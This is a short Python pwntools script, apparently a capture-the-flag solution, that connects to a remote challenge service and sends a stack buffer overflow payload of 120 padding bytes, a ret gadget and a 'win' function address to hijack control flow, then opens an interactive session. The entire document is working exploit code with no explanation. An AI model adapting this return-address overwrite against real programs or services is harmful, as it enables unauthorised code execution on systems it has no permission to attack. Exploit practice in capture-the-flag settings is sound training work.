from pwn import *

#r = process("./rip")
r = remote("io.ept.gg", 30009)

r.recvuntil(b">")

win = 0x4012f4 
ret = 0x40101a 
offset = b"A"*120

payload = offset + p64(ret) + p64(win)

r.sendline(payload)

r.interactive()

